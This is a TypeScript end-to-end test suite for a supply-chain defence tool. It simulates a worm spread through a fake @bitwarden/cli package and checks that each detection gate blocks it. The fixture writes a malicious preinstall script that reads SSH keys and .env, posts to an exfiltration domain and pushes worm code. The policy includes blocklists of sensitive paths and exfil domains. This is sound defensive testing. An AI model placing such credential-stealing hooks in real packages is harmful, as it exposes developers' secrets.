import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { writeFileSync, mkdirSync, existsSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { preInstallScan, type PackageMeta } from '../../src/supply-chain/dependency-attestor.js';
import { checkLifecycleHooks } from '../../src/supply-chain/hook-sandbox.js';
import { generateLockfileAttestation, verifyLockfileAttestation } from '../../src/hardening/lockfile-attestation.js';
import { checkSupplyChainWorm } from '../../src/audit/rules/supply-chain-worm.js';
import { AlertBus, createAlert } from '../../src/alerts/bus.js';
import { AlertEscalator } from '../../src/alerts/escalation.js';
import type { Alert, AlertHandler, SystemSnapshot, PolicyManifest, SupplyChainPolicy } from '../../src/types.js';

const FIXTURE_DIR = './test-e2e-fixtures';
const NODE_MODULES = join(FIXTURE_DIR, 'node_modules');

class CollectorHandler implements AlertHandler {
  received: Alert[] = [];
  async handle(alert: Alert): Promise<void> {
    this.received.push(alert);
  }
}

function makePolicy(): SupplyChainPolicy {
  return {
    quarantineWindowHours: 24,
    preinstallHookPolicy: 'blocklist',
    preinstallHookAllowlist: [],
    behavioralDiff: {
      enabled: true,
      newEndpointBlockThreshold: 1,
      sensitivePathBlocklist: ['~/.ssh/**', '~/.aws/**', '**/.env'],
    },
    exfilDomainBlocklist: ['audit.checkmarx.cx'],
    trustedPublishers: ['@bitwarden', '@orderly-network'],
    lockfileAttestation: { required: true, algorithm: 'sha256' },
  };
}

function makeManifest(): PolicyManifest {
  return {
    version: '2.0',
    last_updated: '2026-04-01T00:00:00Z',
    updated_by: 'test',
    global: { network: 'testnet', aggregate_exposure_limit_usd: 50000, authorized_wallets: [], known_agent_addresses: [] },
    yieldclaw: { vault_ids: [], hard_limits: { max_drawdown_pct: 5, max_daily_loss_pct: 3, max_leverage: 3, max_position_size_pct: 25, max_concurrent_positions: 1, max_order_frequency_per_min: 10, data_staleness_max_sec: 60 }, withdrawal: { max_per_request_usd: 10000, daily_limit_usd: 50000, cooldown_sec: 300 }, share_price: { max_hourly_change_pct: 5, max_daily_change_pct: 15 }, nav_drift_tolerance_pct: 0.5 },
    payment_layer: { trading: { allowed_symbols: [], max_leverage: 10, max_position_size_usd: 5000, max_open_positions: 3, max_daily_loss_usd: 500, allowed_order_types: ['market'], require_approval_above_usd: 2000 }, swaps: { allowed_tokens: ['USDC'], max_swap_amount_usd: 1000, max_slippage_pct: 0.02 }, vaults: { allowed_vault_ids: [], max_deposit_per_tx_usd: 5000, max_withdraw_per_tx_usd: 1000, daily_withdraw_limit_usd: 3000, cooldown_after_deposit_hours: 24 }, spending: { max_per_request_usd: 1, hourly_limit_usd: 10, daily_limit_usd: 50 }, session: { max_ttl_seconds: 86400, max_consecutive_violations: 5 } },
    otterclaw: { skill_hashes: {}, schema_hash: '', validator_hash: '', cli_binary_hash: '', url_allowlist: [] },
    agentic_mm: { risk_presets: {}, safety: { max_drawdown_pct: 5, volatility_pause_multiplier: 3, funding_guard_threshold_pct: 1, cascade_same_side_fills: 5, cascade_window_sec: 3 }, auto_tuner: { warmup_hours: 2, max_changes_per_24h: 3 }, fill_monitor: { max_poll_age_ms: 2000 } },
    growth_agent: { max_playbooks_per_cycle: 2, allowed_playbooks: [], fee_change_max_bps: 2, builder_tier_floor: 'PUBLIC', watchdog_enforcement_enabled: false, max_fee_changes_per_day: 5, max_campaigns_per_day: 3 },
    supplyChain: makePolicy(),
  } as PolicyManifest;
}

describe('Supply Chain E2E — Bitwarden Shai-Hulud Attack Simulation', () => {
  beforeEach(() => {
    mkdirSync(NODE_MODULES, { recursive: true });
  });

  afterEach(() => {
    if (existsSync(FIXTURE_DIR)) rmSync(FIXTURE_DIR, { recursive: true, force: true });
  });

  it('full Bitwarden chain: preinstall hook + cred theft + exfil + propagation', async () => {
    const policy = makePolicy();
    const manifest = makeManifest();

    // 1. Set up malicious package replicating @bitwarden/cli@2026.4.0
    const malPkgDir = join(NODE_MODULES, '@bitwarden', 'cli');
    mkdirSync(malPkgDir, { recursive: true });
    writeFileSync(join(malPkgDir, 'package.json'), JSON.stringify({
      name: '@bitwarden/cli',
      version: '2026.4.0',
      scripts: { preinstall: 'node lifecycle.js' },
    }));
    writeFileSync(join(malPkgDir, 'lifecycle.js'), [
      'const fs = require("fs");',
      'const https = require("https");',
      'const { execSync } = require("child_process");',
      'const sshKey = fs.readFileSync(process.env.HOME + "/.ssh/id_rsa");',
      'const envData = fs.readFileSync(".env");',
      'https.request({ hostname: "audit.checkmarx.cx", method: "POST" });',
      'execSync("git push worm main");',
      'fs.writeFileSync(".github/workflows/worm.yml", "evil");',
    ].join('\n'));

    // GATE 1: Hook sandbox blocks preinstall
    const hookResult = checkLifecycleHooks(
      NODE_MODULES,
      [{ name: '@bitwarden/cli', version: '2026.4.0' }],
      policy,
    );
    expect(hookResult.allowed).toBe(false);
    expect(hookResult.blockedPackages).toContain('@bitwarden/cli');
    expect(hookResult.alerts.some(a => a.severity === 'critical')).toBe(true);

    // GATE 2: Pre-install scan blocks on quarantine (published <24h ago)
    const packages: PackageMeta[] = [{
      name: '@bitwarden/cli',
      version: '2026.4.0',
      publishedAt: new Date(Date.now() - 2 * 60 * 60 * 1000).toISOString(),
    }];
    const scanResult = preInstallScan(packages, policy, NODE_MODULES);
    expect(scanResult.allowed).toBe(false);
    expect(scanResult.alerts.some(a => a.check === 'quarantine_window')).toBe(true);
    // Trusted publisher (@bitwarden) does NOT bypass quarantine
    expect(scanResult.alerts[0].message).toContain('does NOT bypass quarantine');

    // GATE 3: Even if it got past quarantine, behavioral diff catches it
    const olderPackages: PackageMeta[] = [{
      name: '@bitwarden/cli',
      version: '2026.4.0',
      publishedAt: new Date(Date.now() - 48 * 60 * 60 * 1000).toISOString(),
    }];
    const behaviorResult = preInstallScan(olderPackages, policy, NODE_MODULES);
    expect(behaviorResult.allowed).toBe(false);
    expect(behaviorResult.alerts.some(a =>
      a.check === 'exfil_domain_blocked' || a.check === 'sensitive_path_access'
    )).toBe(true);

    // GATE 4: Worm rule would detect post-execution patterns
    const snapshot: SystemSnapshot = {
      timestamp: Date.now(),
      yieldclaw: { ok: false, error: 'not configured', latencyMs: 0 },
      mm: { ok: false, error: 'not configured', latencyMs: 0 },
      guardian: { ok: false, error: 'not configured', latencyMs: 0 },
      otterclaw: { ok: false, error: 'not configured', latencyMs: 0 },
      growthAgent: { ok: false, error: 'not configured', latencyMs: 0 },
      listing: { ok: false, error: 'not configured', latencyMs: 0 },
      network: {
        ok: true,
        latencyMs: 10,
        data: {
          connections: [],
          nonAllowlistedOutbound: [{
            localAddress: '127.0.0.1', localPort: 54321,
            remoteAddress: 'audit.checkmarx.cx', remotePort: 443,
            state: 'ESTABLISHED',
          }],
        },
      },
      filesystem: {
        ok: true,
        latencyMs: 5,
        data: {
          sensitivePathAccesses: [
            { path: `${process.env.HOME ?? '~'}/.ssh/id_rsa`, operation: 'read', timestamp: Date.now() },
          ],
          modifiedFiles: [],
        },
      },
      process: {
        ok: true,
        latencyMs: 8,
        data: {
          processes: [],
          suspiciousChildren: [
            { pid: 999, name: 'git', command: 'git push worm main', ppid: 100 },
            { pid: 1000, name: 'node', command: '.github/workflows/worm.yml', ppid: 100 },
          ],
          nodeProcessCount: 2,
        },
      },
    };

    const wormAlerts = checkSupplyChainWorm(snapshot, manifest);
    expect(wormAlerts.some(a => a.check === 'worm_propagation')).toBe(true);
    expect(wormAlerts.find(a => a.check === 'worm_propagation')?.severity).toBe('critical');

    // GATE 5: Alert pipeline — critical supply-chain alerts bypass dedup
    const bus = new AlertBus();
    const collector = new CollectorHandler();
    bus.register(collector);

    const allAlerts = [...hookResult.alerts, ...scanResult.alerts, ...wormAlerts];
    await bus.emitAll(allAlerts);
    const criticalCount = collector.received.filter(a =>
      a.source === 'supply-chain' && a.severity === 'critical',
    ).length;
    expect(criticalCount).toBeGreaterThanOrEqual(2);

    // GATE 6: Escalator does NOT cycle-promote supply-chain alerts
    const escalator = new AlertEscalator(2);
    const scAlerts = allAlerts.filter(a => a.source === 'supply-chain');
    escalator.process(scAlerts);
    const escalations = escalator.process(scAlerts);
    expect(escalations).toHaveLength(0);
  });

  it('lockfile attestation detects tamper during deploy', () => {
    const lockPath = join(FIXTURE_DIR, 'package-lock.json');
    const attestPath = join(FIXTURE_DIR, '.secclaw', 'lockfile-attest.json');

    writeFileSync(lockPath, JSON.stringify({ lockfileVersion: 3, packages: {} }));
    generateLockfileAttestation(lockPath, attestPath);

    // Tamper with lockfile (simulating attacker modifying dependencies)
    writeFileSync(lockPath, JSON.stringify({
      lockfileVersion: 3,
      packages: { 'node_modules/@bitwarden/cli': { version: '2026.4.0-malicious' } },
    }));

    const result = verifyLockfileAttestation(lockPath, attestPath, makePolicy());
    expect(result.valid).toBe(false);
    expect(result.alerts[0].check).toBe('lockfile_tampered');
    expect(result.alerts[0].severity).toBe('critical');
  });

  it('safe package passes all gates', async () => {
    const policy = makePolicy();
    const safePkgDir = join(NODE_MODULES, '@orderly-network', 'sdk');
    mkdirSync(safePkgDir, { recursive: true });
    writeFileSync(join(safePkgDir, 'package.json'), JSON.stringify({
      name: '@orderly-network/sdk',
      version: '1.0.0',
    }));
    writeFileSync(join(safePkgDir, 'index.js'), 'module.exports = { greet: () => "hello" };');

    const hookResult = checkLifecycleHooks(
      NODE_MODULES,
      [{ name: '@orderly-network/sdk' }],
      policy,
    );
    expect(hookResult.allowed).toBe(true);

    const packages: PackageMeta[] = [{
      name: '@orderly-network/sdk',
      version: '1.0.0',
      publishedAt: new Date(Date.now() - 72 * 60 * 60 * 1000).toISOString(),
    }];
    const scanResult = preInstallScan(packages, policy, NODE_MODULES);
    expect(scanResult.allowed).toBe(true);
  });
});
